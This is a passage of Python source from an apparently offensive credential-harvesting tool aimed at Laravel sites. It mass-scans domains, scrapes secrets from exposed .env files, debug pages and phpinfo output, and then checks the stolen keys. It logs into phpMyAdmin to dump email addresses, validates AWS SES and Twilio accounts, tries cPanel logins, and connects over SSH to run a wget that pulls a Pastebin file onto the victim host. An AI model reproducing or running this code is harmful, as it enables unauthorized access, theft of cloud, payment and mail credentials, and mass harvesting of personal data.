        req = requests.get(url ).json()
        req = [ref_rev(root_domain(str(req['domain']))) for req in req]
        for i in range(len(req)):
            if ':' in str(req[i]):
                req[i] = str(req[i]).split(':')[0]
        lista = [*set(req)]
        with open('Reversed.txt', 'r', errors='ignore') as file:
            all_sites = [line.strip() for line in file]
        lista = [site for site in lista if site not in all_sites]
        if int(len(lista)) != 0:
            print(fontstyle.apply(f'[{fg}#{fw}] [ {fg}{host}{fw} ]━━[ {fg}{len(lista)}{fw} ]','bold'))
            print('\n'.join(lista), file=open('Reversed.txt','a'))
        else:
            print(fontstyle.apply(f'[{fr}#{fw}] [ {fr}{host}{fw} ]━━[ {fr}{len(lista)}{fw} ]','bold'))
    except:
        print(fontstyle.apply(f'[{fr}#{fw}] [ {fr}{host}{fw} ]━━[ {fr}{len(lista)}{fw} ]','bold'))
    return

def webscan():
    lista = list(x.strip() for x in open(input('{}[{}+{}] List : '.format(fw,fg,fw)),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(rev_webscan , lista)
    except:
        pass

# LARAVEL ++++++++++++++++++++++++++++++++++++++++++++++++++++++
    
def rebuild_url(url, path):
    if url[-1] == '/':
        return url + path
    else:
        return url + '/' + path

def remove_cot(inp):
    try:
        rep = reg('= "(.*?)"',str(inp))[0]
        return str(inp).replace('= "{}"'.format(rep),'= {}'.format(rep))
    except:
        try:
            rep = reg("= '(.*?)'",str(inp))[0]
            return str(inp).replace("= '{}'".format(rep),'= {}'.format(rep))
        except:
            pass

def sort_lines(source):
    lines = source.strip().split('\n')
    sorted_lines = sorted(lines, key=lambda line: line.split(' = ')[0].strip())
    return '\n'.join(sorted_lines)

def ref_eq(inp):
    return str(inp).replace('=',' = ',1)

def reformat_text_Exception(source):
    source = bs(source,'html.parser')
    out = ''
    table = source.find('div',{'class':'data-table','id':'sg-environment-variables'}).find_all('tr')
    for t in table:
        if '<td>' in str(t):
            all = str(t).replace('\n','')
            name = str(all).split('<tr><td>')[1].split('</td><td>')[0]
            value = str(all).split('</span')[0].split('>')[-1]
            x = '{} = {}'.format(name,value)
            if ('= "' in str(x) and str(x).endswith('"')) or ("= '" in str(x) and str(x).endswith("'")):
                x = remove_cot(str(x))
            if str(x) not in str(out):
                if str(x).split('=')[1].replace(' ','') != '':
                    out += str(x) + '\n'
    return sort_lines(out)

def reformat_text_env(source):
    source = str(source).split('\n')
    source = [source.replace('\r','') for source in source if str(source).replace('\r','') != '' and not(str(source).startswith('#')) and '${' not in str(source)] 
    source = [source for source in source if '=' in str(source) and str(source).split('=')[1] != '']
    out = ''
    for s in source:
        s = ref_eq(str(s))
        if ('= "' in str(s) and str(s).endswith('"')) or ("= '" in str(s) and str(s).endswith("'")):
            s = remove_cot(str(s))
        if str(s) not in str(out):
            out += s + '\n'
    return out

def debugfixer(source):
    out = ''
    source = bs(source ,'html.parser')
    tags = source.find_all('table',{'class':'data-table'})
    for tag in tags:
        if 'APP_KEY' in str(tag):
            source = tag
    tags = source.find_all('tr')
    for tag in tags:
        try:
            name = reg('<td>(.*?)</td>',str(tag))[0]
            value = str(tag).split('</span')[0].split('">')[-1].split('</pre')[0].strip()
            s = '{} = {}'.format(name,value)
            if '= "' in str(s) or "= '" in str(s):
                s = remove_cot(str(s))
            if str(s).split('=')[1].replace(' ','') != '':
                if str(s) not in str(out):
                    out += s + '\n'
        except:pass
    return out

def reformat_envjs(source):
    formatted_source = ""
    lines = source.split('\n')
    for line in lines:
        line = line.strip()
        if line and not line.startswith('//') and '=' in line:
            line = line.replace('const ', '').rstrip(';')
            formatted_source += line + '\n'
    return formatted_source.strip()

def reformat_text_phpinfo(source):
    source = bs(source,'html.parser')
    table = source.find_all('table')
    for tab in table:
        if '$_SERVER' in str(tab):
            table = str(tab)
    fields = reg('<td class="e">(.*?)</td><td class="v">(.*?)</td></tr>',str(table))
    out = ''
    for field in fields:
        e = str(field[0]).split("['")[1].split("']")[0]
        v = field[1]
        x = '{} = {}'.format(e,v)
        if str(x) not in str(out):
            out += str(x) + '\n'
    return out

def smtp_reformat(creds):
    host = ''
    port = ''
    user = ''
    pwd = ''
    from_ = ''
    for key , value in creds.items():
        if 'host' in str(key).lower():
            host = str(value)
        elif 'port' in str(key).lower():
            port = str(value)
        elif 'user' in str(key).lower():
            user = str(value)
        elif 'pass' in str(key).lower():
            pwd = str(value)
        elif 'from' in str(key).lower():
            from_ = str(value)
    
    if from_ != '':
        text = '{}|{}|{}|{}|{}'.format(host,port,user,pwd,from_)
    else:
        text = '{}|{}|{}|{}'.format(host,port,user,pwd)
    return text

def twillio_reformat(creds):
    TAS = ''
    TAT = ''
    TN = ''
    for key , value in creds.items():
        if 'sid' in str(key).lower():
            TAS = str(value)
        elif 'token' in str(key).lower():
            TAT = str(value)
        elif 'number' in str(key).lower():
            TN = str(value)
    
    if TN == '':
        text = '{}|{}'.format(TAS , TAT)
    else:
        text = '{}|{}|{}'.format(TAS , TAT , TN)
    return text

def ssh_reformat(creds):
        host = ''
        usr = ''
        pwd = ''
        for key , value in creds.items():
            if 'HOST' in str(key):
                host = str(value)
            elif 'SSH_USERNAME' in str(key):
                usr = str(value)
            elif 'SSH_PASSWORD' in str(key):
                pwd = str(value)
        text = '{}|{}|{}'.format(host , usr , pwd)
        return text

class Extractor():

    def print_creds(creds):
        for vr , vl in creds.items():
            print(fontstyle.apply('[{}>{}] {} : '.format(fg,fw,vr),'bold') + str(vl))
        print()
        return
    
    def check_POST_req_available(session, url, database, table, token_phpmyadmin, page):
        payload = {
            'db': '{}'.format(database),
            'table': '{}'.format(table),
            'token': '{}'.format(token_phpmyadmin),
            'sql_query': 'SELECT * FROM `{}` LIMIT {}, 100'.format(table, page * 100),
            'pos': str(page * 100)
        }
        req = session.post('{}/sql.php'.format(url), headers=headers, data=payload).text
        table_emails = reg(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', str(req))
        return table_emails

    def check_GET_req_available(session, url, database, table, token_phpmyadmin, page):
        req = session.get(f'{url}/sql.php?db={database}&table={table}&pos={page * 100}&ajax_request=true&ajax_page_request=true&token={token_phpmyadmin}', headers=headers).text
        table_emails = reg(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', str(req))
        return table_emails

    def extract_all_emails_from_table(session, url, database, table, token_phpmyadmin):
        all_emails = []
        page = 0
        while True:
            post_emails = Extractor.check_POST_req_available(session, url, database, table, token_phpmyadmin, page)
            if not post_emails:
                get_emails = Extractor.check_GET_req_available(session, url, database, table, token_phpmyadmin, page)
                if not get_emails:
                    break
                if all_emails == get_emails:
                    break
                all_emails.extend(get_emails)
            else:
                if all_emails == post_emails:
                    break
                all_emails.extend(post_emails)
            all_emails = [*set(all_emails)]
            page += 1
        all_emails = [*set(all_emails)]
        return all_emails

    def extract_emails_from_phpmyadmin(creds):
        login_chk = False
        url = ''
        username = ''
        password = ''
        database = ''
        for key , value in creds.items():
            if 'host' in str(key).lower():
                url = str(value)
            if 'username' in str(key).lower():
                username = str(value)
            if 'password' in str(key).lower():
                password = str(value)
            if 'database' in str(key).lower():
                database = str(value)
        session = requests.Session()
        req = session.get(url, headers=headers).text
        set_session = ''
        token_phpmyadmin = ''
        if 'name="set_session" ' in str(req):
            set_session = reg('name="set_session" value="(.*?)"',str(req))[0]
        if 'token:"' in str(req):
            token_phpmyadmin = reg(',token:"(.*?)"',str(req))[0]
        elif 'name="token" value="' in str(req):
            token_phpmyadmin = reg('name="token" value="(.*?)"',str(req))[0]
        if 'name="login_form"' in str(req):
            redirect_payload = reg('action="(.*?)" name="login_form" ',str(req))[0]
        if set_session != '' and token_phpmyadmin != '':
            payload = {
                'set_session': '{}'.format(set_session),
                'pma_username': '{}'.format(username),
                'pma_password': '{}'.format(password),
                'server': '1',
                'token': '{}'.format(token_phpmyadmin)
            }
        else:
            payload = {
                'pma_username': '{}'.format(username),
                'pma_password': '{}'.format(password),
                'server': '1',
                'target':'{}'.format(redirect_payload),
                'token': '{}'.format(token_phpmyadmin)
            }
        req = session.post(f"{url}/{redirect_payload}", headers=headers, data=payload)
        if req.status_code != 200 or 'logged_in:false' in req.text:
            login_chk = True
            req = session.get(f"{url}/{redirect_payload}", headers=headers)
        soup = bs(req.text, 'html.parser')
        maindb = soup.find_all('a', {'class': 'hover_show_full'})
        for db_link in maindb:
            if database in db_link.text:
                maindb_url = db_link.get('href')
                break
        req = session.get(f"{url}/{maindb_url}", headers=headers)
        tables = reg(f'`{database}`.`(.*?)`', req.text)
        all_emails = []
        for table in tables:
            emails = Extractor.extract_all_emails_from_table(session, url, database, table, token_phpmyadmin)
            if emails:
                all_emails.extend(emails)
        all_emails = [*set(all_emails)]
        if all_emails:
            print(fontstyle.apply(f'[ {fg}DATABASE{fw} : {fr}{database}{fw} ] [ {fg}EMAILS GRABBED{fw} : {fr}{len(all_emails)}{fw} ]', 'bold'))
            print('\n'.join(all_emails), file=open('Results/Emails_Grabbed_PHPMYADMIN.txt','a'))
        if login_chk:
            return True
        return False
    
    def phpmyadmin_checker(creds):
        HOST = ''
        USERNAME = ''
        PASSWORD = ''
        for key , value in creds.items():
            if 'host' in str(key).lower():
                HOST = str(value)
            if 'username' in str(key).lower():
                USERNAME = str(value)
            if 'password' in str(key).lower():
                PASSWORD = str(value)
        if HOST != '' and USERNAME != '' and PASSWORD != '':
            try:
                session = requests.Session()
                req = session.get(HOST , headers=headers).text
                set_session = ''
                token_phpmyadmin = ''
                if 'name="set_session" ' in str(req):
                    set_session = reg('name="set_session" value="(.*?)"',str(req))[0]
                if 'token:"' in str(req):
                    token_phpmyadmin = reg(',token:"(.*?)"',str(req))[0]
                elif 'name="token" value="' in str(req):
                    token_phpmyadmin = reg('name="token" value="(.*?)"',str(req))[0]
                if 'name="login_form"' in str(req):
                    redirect_payload = reg('action="(.*?)" name="login_form" ',str(req))[0]
                if set_session != '' and token_phpmyadmin != '':
                    payload = {
                        'set_session': '{}'.format(set_session),
                        'pma_username': '{}'.format(USERNAME),
                        'pma_password': '{}'.format(PASSWORD),
                        'server': '1',
                        'token': '{}'.format(token_phpmyadmin)
                    }
                else:
                    payload = {
                        'pma_username': '{}'.format(USERNAME),
                        'pma_password': '{}'.format(PASSWORD),
                        'server': '1',
                        'target':'{}'.format(redirect_payload),
                        'token': '{}'.format(token_phpmyadmin)
                    }
                req = session.post('{}/{}'.format(HOST,redirect_payload),headers=headers,data=payload).text
                if 'logged_in:false' not in str(req):
                    return True
            except:
                pass
        return False
    
    def checkcpanel(string):
        try:
            string = str(string).split('|')
            link = str(string[0]).strip()
            user = str(string[1]).strip()
            pwd = str(string[2]).strip()
            if 'http' not in str(link):
                link = 'http://' + str(link)
            if ':2082' not in str(link) and ':2083' not in str(link):
                link = str(link) + ':2083'
            try:
                req = requests.get(link , headers=headers , timeout = 5)
                if 'cpanel</title' in str(req.text).lower() or 'title>cpanel' in str(req.text).lower():
                    if str(req.url) != str(link):
                        link = str(req.url)
                payload = {
                    'user': '{}'.format(user),
                    'pass': '{}'.format(pwd),
                    'goto_uri': '/'
                }
                login = requests.post(link + '/login/?login_only=1' , headers = headers ,data = payload, timeout = 8).text
                string = '{}|{}|{}'.format(link,user,pwd)
                if 'security_token' in str(login):
                    return True
                else:
                    return False
            except:
                return False
        except:
            pass
        return False

    def check_twilio(inp):
        try:
            sid, token, number = str(inp).split('|') if '|' in inp else (str(inp).split('|') + [''])
            status = 'OFFLINE'
            url = 'https://api.twilio.com'
            check = '/2010-04-01/Accounts.json'
            auth = (sid, token)
            
            response = requests.get(url + check, auth=auth).text
            if '"message":"Authenticat' not in response:
                status = search(r'"status": "(.*?)"', response).group(1)
                type = search(r'"type": "(.*?)"', response).group(1)
                
                balance_path = search(r'"balance": "(.*?)"', response).group(1)
                balance_response = requests.get(url + balance_path, auth=auth).text
                if '"status":' not in balance_response:
                    balance = search(r'"balance": "(.*?)"', balance_response).group(1)
                    currency = search(r'"currency": "(.*?)"', balance_response).group(1)
                    
                with open('Results/TWILIO_BALANCED.txt', 'a', errors='ignore') as file:
                    if number == '':
                        t = f'SID : {sid}\nTOKEN : {token}\nTYPE : {type}\nSTATUS : {status}\nBALANCE : {balance} {currency}\n\n'
                    else:
                        t = f'SID : {sid}\nTOKEN : {token}\nNUMBER : {number}\nTYPE : {type}\nSTATUS : {status}\nBALANCE : {balance} {currency}\n\n'
                    file.write(t)
        except Exception:
            pass
        return
    
    def aws_checker(creds):
        regions = [
            'us-east-1',
            'us-east-2',
            'us-west-1',
            'us-west-2',
            'eu-west-1',
            'eu-west-2',
            'eu-west-3',
            'eu-central-1',
            'eu-north-1',
            'ap-southeast-1',
            'ap-southeast-2',
            'ap-northeast-1',
            'ap-northeast-2',
            'sa-east-1',
            'ca-central-1',
            'ap-south-1',
            'me-south-1',
            'af-south-1'
            ]
        AWS_ACCESS_KEY = ''
        AWS_SECRET_KEY = ''
        for key , value in creds.items():
            if 'secret' in str(key).lower():
                AWS_SECRET_KEY = str(value)
            if 'access' in str(key).lower() and value != AWS_SECRET_KEY:
                AWS_ACCESS_KEY = str(value)

        for AWS_REGION in regions:
            if AWS_ACCESS_KEY != '' and AWS_SECRET_KEY != '':
                try:
                    client = boto3.client('ses',region_name=AWS_REGION,aws_access_key_id=AWS_ACCESS_KEY,aws_secret_access_key=AWS_SECRET_KEY)
                    asu = client.get_send_quota()
                    y = json.dumps(asu)
                    x = json.loads(y)
                    if 'Max24HourSend' in x:
                        limit = x['Max24HourSend']
                        response = client.list_identities(
                            IdentityType='EmailAddress',
                            MaxItems=123,
                            NextToken='',
                            )
                        senders = response['Identities']
                        print(fontstyle.apply('[ ','bold') + fontstyle.apply('LIVE','bold/italic/green') + fontstyle.apply(' ]','bold') + fontstyle.apply(' {}|{}|{} [ LIMIT : {}{}{}]'.format(AWS_ACCESS_KEY,AWS_SECRET_KEY,AWS_REGION,fg,limit,fw),'bold'))
                        rez = '{}|{}|{} (LIMIT:{})'.format(AWS_ACCESS_KEY,AWS_SECRET_KEY,AWS_REGION,limit)
                        open('Results/AWS_LIVE_KEYS.txt','a',errors='ignore').write(rez + '\n')
                        for sender in senders:
                            smtp = 'email-smtp.'+AWS_REGION+'.amazonaws.com|587|{}|{}|{}'.format(AWS_ACCESS_KEY,AWS_SECRET_KEY,sender)
                            open('Results/AWS_SMTP.txt','a',errors='ignore').write(smtp + '\n')
                except:
                    _ = ''
        return
        
    def login_ssh(creds):
        host = ''
        username = ''
        password = ''
        for key , value in creds.items():
            if 'host' in str(key).lower():
                host = str(value)
            if 'username' in str(key).lower():
                username = str(value)
            if 'password' in str(key).lower():
                password = str(value)
        cnx = False
        upload = False
        try:
            client = paramiko.client.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, username=username, password=password)
            cnx = True
            _stdin, _stdout,_stderr = client.exec_command('ls')
            res = _stdout.read().decode()
            if 'Invalid argument' not in str(res):
                _stdin, _stdout,_stderr = client.exec_command("wget https://pastebin.com/raw/ErYsJ0Km -O nyx.txt")
                _stdin, _stdout,_stderr = client.exec_command('ls')
                res = _stdout.read().decode()
                if 'nyx.txt' in str(res):
                    upload = True
                    _stdin, _stdout,_stderr = client.exec_command('rm nyx.txt')
                if cnx and upload:
                    return True
                elif cnx and not upload:
                    return False
                client.close()
            else:
                return False
        except:
            return False
        return False
    
    def extract_smtps(source):
        smtp_creds = {}
        required_keys = ['HOST', 'USERNAME', 'PASSWORD']
        default_port = '587'
        
        pattern = r'\b((MAIL|SMTP)_[A-Z_]+)\b\s*=\s*["\']?([^"\']+?)["\']?\s*\n'
        smtp_keys_found = {}
        for match in finditer(pattern, source, IGNORECASE):
            key, _, value = match.groups()
            key = key.strip()
            if not smtp_keys_found.get(key, False) and 'test' not in key.lower() and value.lower() != 'null':
                value = value.strip()
                if '=' not in str(value) and '***' not in str(value):
                    if 'HOST' in key and 'HOST' not in smtp_creds:
                        if value not in ['localhost', '127.0.0.1']:
                            smtp_creds['HOST'] = value
                    elif 'PORT' in key and 'PORT' not in smtp_creds:
                        smtp_creds['PORT'] = value
                    elif 'USERNAME' in key and '(' not in str(value) and ')' not in str(value) and 'USERNAME' not in smtp_creds:
                        smtp_creds['USERNAME'] = value
                    elif 'PASSWORD' in key and 'PASSWORD' not in smtp_creds:
                        smtp_creds['PASSWORD'] = value
                    elif 'FROM_ADDRESS' in key and 'FROM_ADDRESS' not in smtp_creds:
                        smtp_creds['FROM_ADDRESS'] = value
                    smtp_keys_found[key] = True

        if 'PORT' not in smtp_creds:
            smtp_creds['PORT'] = default_port

        if all(key in smtp_creds for key in required_keys):
            return smtp_creds
        else:
            return {}

    def extract_aws_creds(source):
        aws_creds = {}
        regions = [
        'us-east-1',
        'us-east-2',
        'us-west-1',
        'us-west-2',
        'eu-west-1',
        'eu-west-2',
        'eu-west-3',
        'eu-central-1',
        'eu-north-1',
        'ap-southeast-1',
        'ap-southeast-2',
        'ap-northeast-1',
        'ap-northeast-2',
        'sa-east-1',
        'ca-central-1',
        'ap-south-1',
        'me-south-1',
        'af-south-1'
        ]
        aws_pattern = r'\b(AWS_(?:S3_)?[A-Z_]+)\b\s*=\s*["\']?([^"\']+?)["\']?\s*\n'
        aws_matches = reg(aws_pattern, source, IGNORECASE)
        for key, value in aws_matches:
            if '==' in str(value):
                xx = base64.b64decode(str(value))
                for region in regions :
                    if str(region) in str(xx):
                        aws_creds['AWS_REGION'] = region
            if 'KEY' not in str(aws_creds) or 'SECRET' not in str(aws_creds) or 'REGION' not in str(aws_creds):
                if 'session' not in str(key).lower() and 'bucket' not in str(key).lower() and 'endpoint' not in str(key).lower():
                    if '=' not in str(value) and '***' not in str(value):
                        aws_creds[key] = value.strip()

        aws_region = aws_creds.get('AWS_REGION', aws_creds.get('AWS_DEFAULT_REGION', ''))
        if aws_region and len(aws_creds) == 1:
            return {}
        ACCESS_KEY = ''
        SECRET_KEY = ''
        REGION = ''
        for key , value in aws_creds.items():
            if 'secret' in str(key).lower():
                SECRET_KEY = str(value)
            if 'access' in str(key).lower() and value != SECRET_KEY:
                ACCESS_KEY = str(value)
            if 'region' in str(key).lower():
                REGION = str(value)
        AWS2CHECK = '{}|{}|{}'.format(ACCESS_KEY,SECRET_KEY,REGION)
        if '||' not in str(AWS2CHECK):
            open('Results/AWS2CHECK.txt','a',errors='ignore').write(AWS2CHECK+ '\n')
        return aws_creds

    def extract_ses_creds(source):
        ses_creds = {}
        ses_pattern = r'\b(SES_[A-Z_]+)\b\s*=\s*["\']?([^"\']+?)["\']?\s*\n'
        ses_matches = reg(ses_pattern, source, IGNORECASE)
        for key, value in ses_matches:
            if '=' not in str(value) and '***' not in str(value):
                ses_creds[key] = value.strip()
        return ses_creds

    def extract_do_creds(source):
        do_creds = {}
        do_pattern = r'\b(DO_[A-Z_]+)\b\s*=\s*["\']?([^"\']+?)["\']?\s*\n'
        do_matches = reg(do_pattern, source, IGNORECASE)
        for key, value in do_matches:
            if '=' not in str(value) and '***' not in str(value):
                do_creds[key] = value.strip()
        return do_creds

    def extract_db_creds(source):
        db_creds = {}
        pattern = r'\b(DB_\w+)\b\s*=\s*["\']?([^"\']+?)["\']?\s*\n'
        matches = reg(pattern, source, IGNORECASE)
        for key, value in matches:
            if 'HOST' not in str(db_creds) or 'CONNECTION'not in str(db_creds) or 'DATABASE' not in str(db_creds) or 'PORT' not in str(db_creds) or 'USERNAME' not in str(db_creds) or 'PASSWORD' not in str(db_creds):
                if '=' not in str(value) and '***' not in str(value):
                    db_creds[key] = value.strip()
        
        return db_creds
    
    def extract_phpmyadmin(url, lista):
        data = {
            'HOST': 'http://{}/phpmyadmin'.format(url),
            'DATABASE': '',
            'USERNAME': '',
            'PASSWORD': ''
        }
        for i, j in lista.items():
            if 'database' in str(i).lower():
                data['DATABASE'] = str(j)
            elif 'username' in str(i).lower():
                data['USERNAME'] = str(j)
            elif 'password' in str(i).lower() and str(j).strip() != '':
                data['PASSWORD'] = str(j)

        if data['DATABASE']!= '' and data['USERNAME'] != '' and data['PASSWORD'] != '':
            return data
        return {}

    def extract_cpanel(url, lista):
        data = {
            'HOST': 'http://{}:2083'.format(url),
            'USERNAME': '',
            'PASSWORD': ''
        }
        for i, j in lista.items():
            if 'username' in str(i).lower():
                data['USERNAME'] = str(j)
            elif 'password' in str(i).lower() and str(j).strip() != '':
                data['PASSWORD'] = str(j)

        if data['USERNAME'] != '' and data['PASSWORD'] != '':
            string2check = '{}|{}|{}'.format(data['HOST'],data['USERNAME'],data['PASSWORD'])
            return data, string2check
        return {} , {}

    def extract_SSH(url, lista):
        data = {
            'HOST': '{}'.format(url),
            'SSH_USERNAME': '',
            'SSH_PASSWORD': ''
        }

        for i, j in lista.items():
            if 'username' in str(i).lower():
                data['SSH_USERNAME'] = str(j)
            elif 'password' in str(i).lower() and str(j).strip() != '':
                data['SSH_PASSWORD'] = str(j)

        if data['SSH_USERNAME'] != '' and data['SSH_PASSWORD'] != '':
            return data
        return {}

    def extract_sms_creds(source):
        sms_creds = {}
        pattern = r'\b((MEDIA_SMS|MIXMES_SMS|CALL|MSGSMS|CLICKSEND|NEXMO|ENABLEX|SSL_SMS|AIMON|TEXTLOCAL|TEXTNOW|TELNYX|PLIVO|VONAGE|MESSAGEBIRD|TWILIO_SENDGRID|BULK_SMS_API|TENOVIA|ESENDEX|BANDWIDTH|TATANGO|MOBTEXTING|CLICKATELL|INFOBIP|TELAPI|MESSAGEWAY|NIMBUSSMS|MXTERTSMS|SMSAPI|SKEBLO|SMS77|TYNTHEO|SKEBSMS|INTELLOPE|UNIFON|CLOUDMESSAGING|TELAPI|ZENDESK_SMS|SMSUP|WILDBERRIES|WEAVE|SKEBTXT|BULK_SMS|MOBISHY|FIRETEXT|TENOVIA|MOBIZ|TYNSMS|ZIVOSMS|ONEHUNDREDSMS|MYSMSMANTRA|SKEBLOX|MYSMS|SMSGATEWAYHUB|NEXMO_VONAGE|TELESIGN|TANGO_SMS|MOBILEDEAMON|SMSMAGIC|UNIFONTEX|CALL_FIRE|SKEBMSG|EZSMS|SMSMATRIX|ALERTSMS|HAWKSTEXT|SMSPANEL|SMSI360|QUICKTEXT|SKEBSMS|WILDBERRIES|SKEBLOX|MAIL2SMS|BULKSMS1|MOBIPIAR|SMSAPI|MESSAGEMEDIA|MASHAPE_SMS|SMS_C|SMSGORILLA|WAVETEL|EXOTEL|MOBTEXTING|ALPHASMS|SPEECHTEXTING|SMSITONLINE|SMSPM|SMSMINT|BSG|SMSPILOT|GUPSHUP|SMSCOUNTRY|INFOBIP|TELAPI|MESSAGEWAY|NIMBUSSMS|SMSUP|SMS77|TYNTHEO|INTELLOPE|TELECOMSMSGATEWAY|UNIFON|CLOUDMESSAGING|SMSMODEM|ZENDESK_SMS)_\w+|SMS_\w+|SMSIR\-\w+\-\w+)\b\s*=\s*["\']?([^"\']+?)["\']?\s*(?:#.*)?\n'
        matches = reg(pattern, source, IGNORECASE)
        for key, _, value in matches:
            if 'ASKJOIN' not in str(key) and 'SHOW' not in str(key):
                if '=' not in str(value) and '***' not in str(value):
                    sms_creds[key] = value.strip()
        if len(sms_creds) != 1 and 'gateway' not in str(sms_creds):
            return sms_creds

    def extract_twilio_creds(source):
        twilio_creds = {}
        pattern = r'\b((TWILIO|VALID_TWILLO)_[A-Z_]+|AUTH_TOKEN|ACCOUNT_SID)\b\s*=\s*["\']?([^"\']+?)["\']?\s*\n'
        matches = reg(pattern, source, IGNORECASE)
        for key, _, value in matches:
            if '#' in value:
                if '=' not in str(value) and '***' not in str(value):
                    value = value.split('#')[0].strip()
            twilio_creds[key] = value.strip()

        return twilio_creds
        
    def extract_stripe_creds(source):
        stripe_creds = {}
        pattern = r'\bSTRIPE_(\w+)\b\s*= \s*["\']?([^"\']+?)["\']*\n'
        for match in finditer(pattern, source, IGNORECASE):
            key, value = match.groups()
            if 'SHOW' not in str(key):
                if '=' not in str(value) and '***' not in str(value):
                    stripe_creds[key] = value.strip()
        return stripe_creds
    
    def extract_mailgun_creds(source):
        mailgun_creds = {}
        pattern = r'\b(MAILGUN_[A-Z_]+)\b\s*=\s*["\']?([^"\']+?)["\']?\s*\n'
        matches = reg(pattern, source, IGNORECASE)
        for key, value in matches:
            if '=' not in str(value) and '***' not in str(value):
                mailgun_creds[key] = value.strip()
        return mailgun_creds

    def extract_mailjet_creds(source):
        mailjet_creds = {}
        pattern = r'\b(MAILJET_[A-Z_]+)\b\s*=\s*["\']?([^"\']+?)["\']?\s*\n'
        matches = reg(pattern, source, IGNORECASE)
        for key, value in matches:
            if '=' not in str(value) and '***' not in str(value):
                mailjet_creds[key] = value.strip()
        return mailjet_creds
    
    def SV_LAR(domain , method , creds , filetosave):
        res = ''
        res += 'URL = {}\n'.format(domain)
        res += 'METHOD = {}\n'.format(method)
        for key , value in creds.items():
            res += '{} = {}\n'.format(key,value)
        open('Results/'+filetosave,'a',errors='ignore').write(res + '\n')

    def init(url , resp , method):
        okkk = 0
        resp += '\n' 
        maindomain = str(url).replace('http://','').replace('https://','').split('/')[0]

        sms_creds = Extractor.extract_sms_creds(resp)
        twillio_creds = Extractor.extract_twilio_creds(resp)
        db_creds = Extractor.extract_db_creds(resp)
        smtp_creds = Extractor.extract_smtps(resp)
        aws_creds = Extractor.extract_aws_creds(resp)
        ses_creds = Extractor.extract_ses_creds(resp)
        do_creds = Extractor.extract_do_creds(resp)
        phpmyadmin_creds = Extractor.extract_phpmyadmin(maindomain , db_creds)
        cpanel_creds = Extractor.extract_cpanel(maindomain,db_creds)
        ssh_creds = Extractor.extract_SSH(maindomain , db_creds)
        stripe_creds = Extractor.extract_stripe_creds(resp)
        mailjet_creds = Extractor.extract_mailjet_creds(resp)
        mailgun_creds = Extractor.extract_mailgun_creds(resp)

        msg = fontstyle.apply('[ {}+{} ] {} [ {}{}{} ] '.format(fg,fw,maindomain,fr,method,fw),'bold')
        if chk :
            print(resp)

        if db_creds:
            okkk +=1
            if chk:
                Extractor.print_creds(db_creds)
            msg += fontstyle.apply('\u001b[1m\u001b[42;1m DB \u001b[0m ','bold')
            if not chk:
                Extractor.SV_LAR(maindomain,method,db_creds,'DB.txt')

        if phpmyadmin_creds:
            okkk +=1
            if chk:
                Extractor.print_creds(phpmyadmin_creds)
            if not chk:
                if Extractor.phpmyadmin_checker(phpmyadmin_creds):
                    msg += fontstyle.apply('\u001b[1m\u001b[42;1m PHPMYADMIN \u001b[0m ','bold')
                    Extractor.SV_LAR(maindomain,method,phpmyadmin_creds,'PHPMYADMIN.txt')
                else:
                    phpmyadmin_creds = {}

        if cpanel_creds[0]:
            okkk +=1
            if chk:
                Extractor.print_creds(cpanel_creds[0])
            if not chk:
                if Extractor.checkcpanel(cpanel_creds[1]):
                    msg += fontstyle.apply('\u001b[1m\u001b[42;1m CPANEL \u001b[0m ','bold')
                    Extractor.SV_LAR(maindomain,method,cpanel_creds,'CPANEL.txt')

        if ssh_creds:
            okkk +=1
            if chk:
                Extractor.print_creds(ssh_creds)
            if not chk:
                if Extractor.login_ssh(ssh_creds):
                    msg += fontstyle.apply('\u001b[1m\u001b[42;1m SSH \u001b[0m ','bold')
                    Extractor.SV_LAR(maindomain,method,ssh_creds,'SSH.txt')
                SSH2CHECK = ssh_reformat(ssh_creds)
                open('Results/SSH2CHECK.txt','a',errors='ignore').write(SSH2CHECK + '\n')

        if aws_creds:
            okkk +=1
            if chk:
                Extractor.print_creds(aws_creds)
            msg += fontstyle.apply('\u001b[1m\u001b[42;1m AWS \u001b[0m ','bold')
            if not chk:
                Extractor.aws_checker(aws_creds)
                Extractor.SV_LAR(maindomain,method,aws_creds,'AWS.txt')

        if smtp_creds:
            okkk +=1
            xx = False
            if chk:
                Extractor.print_creds(smtp_creds)
            if 'sendgrid' in str(smtp_creds):
                msg += fontstyle.apply('\u001b[1m\u001b[42;1m SENDGRID SMTP \u001b[0m ','bold')
                if not chk:
                    Extractor.SV_LAR(maindomain,method,smtp_creds,'SENDGRID.txt')
            elif 'mailgun' in str(smtp_creds):
                msg += fontstyle.apply('\u001b[1m\u001b[42;1m MAILGUN SMTP \u001b[0m ','bold')
                if not chk:
                    Extractor.SV_LAR(maindomain,method,smtp_creds,'MAILGUN.txt')
            elif 'office365' in str(smtp_creds):
                msg += fontstyle.apply('\u001b[1m\u001b[42;1m OFFICE365 SMTP \u001b[0m ','bold')
                if not chk:
                    Extractor.SV_LAR(maindomain,method,smtp_creds,'OFFICE365.txt')
            if not xx:
                msg += fontstyle.apply('\u001b[1m\u001b[42;1m SMTP \u001b[0m ','bold')
                if not chk:
                    Extractor.SV_LAR(maindomain,method,smtp_creds,'SMTP.txt')
            if not chk:
                open('Results/SMTP2CHECK.txt','a',errors='ignore').write(smtp_reformat(smtp_creds) + '\n')

        if ses_creds:
            okkk +=1
            if chk:
                Extractor.print_creds(ses_creds)
            msg += fontstyle.apply('\u001b[1m\u001b[42;1m SES \u001b[0m ','bold')
            if not chk:
                Extractor.SV_LAR(maindomain,method,ses_creds,'SES.txt')

        if do_creds:
            okkk +=1
            if chk:
                Extractor.print_creds(do_creds)
            msg += fontstyle.apply('\u001b[1m\u001b[42;1m DIGITAL OCEAN \u001b[0m ','bold')
            if not chk:
                Extractor.SV_LAR(maindomain,method,do_creds,'DIGITAL OCEAN.txt')

        if stripe_creds:
            okkk +=1
            if chk:
                Extractor.print_creds(stripe_creds)
            msg += fontstyle.apply('\u001b[1m\u001b[42;1m STRIPE \u001b[0m ','bold')
            if not chk:
                Extractor.SV_LAR(maindomain,method,stripe_creds,'STRIPE.txt')

        if mailjet_creds:
            okkk +=1
            if chk:
                Extractor.print_creds(mailjet_creds)
